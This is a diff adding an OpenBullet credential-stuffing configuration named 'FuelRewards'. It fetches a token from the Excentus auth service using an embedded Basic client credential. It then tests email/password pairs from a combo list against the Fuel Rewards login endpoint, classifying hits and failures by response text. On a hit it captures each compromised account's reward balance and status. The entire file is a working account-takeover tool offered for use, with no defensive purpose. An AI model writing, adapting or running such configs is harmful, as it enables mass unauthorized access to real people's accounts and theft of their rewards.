@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "FuelRewards",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-10T00:04:24.6892544+01:00",
+  "AdditionalInfo": "",
+  "Author": "Dan",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://auth-connect.excentus.com/authservice/v2/accesstokens" AutoRedirect=TRUE 
+  CONTENT "bizType=B2C&grant_type=client_credentials&" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G928F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic MTY3YTUzM2QtNDU5Ni00NjNiLTljNmQtYzM2ZjQwZTI1MzVkOjk5Y2NhMGVlLTU0NDItNDc1Yy04OGMwLTQ2MDM5Y2FmMmM0OA==" 
+PARSE "<SOURCE>" LR "accessToken\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login" AutoRedirect=TRUE 
+  CONTENT "{\"userId\":\"<USER>\",\"password\":\"<PASS>\",\"partnerAttributes\":{\"partnerAssociation\":\"frprombr\",\"refCode\":\"\",\"participantId\":\"Fleet\",\"name\":\"TIER\",\"value\":\"Fleet\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "access_token: <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "User Not Found" 
+    KEY "Your login has been locked due to too many failed login attempts. Please contact system support" 
+  KEYCHAIN Success OR 
+    KEY "\"rewardBalance\":" 
+PARSE "<SOURCE>" LR "rewardBalance\":" "," Recursive=FALSE -> CAP "BALANCE" "" "" 
+PARSE "<SOURCE>" LR "\"},{\"status\":\"" "\"" Recursive=FALSE -> CAP "STATUS" "" "" 
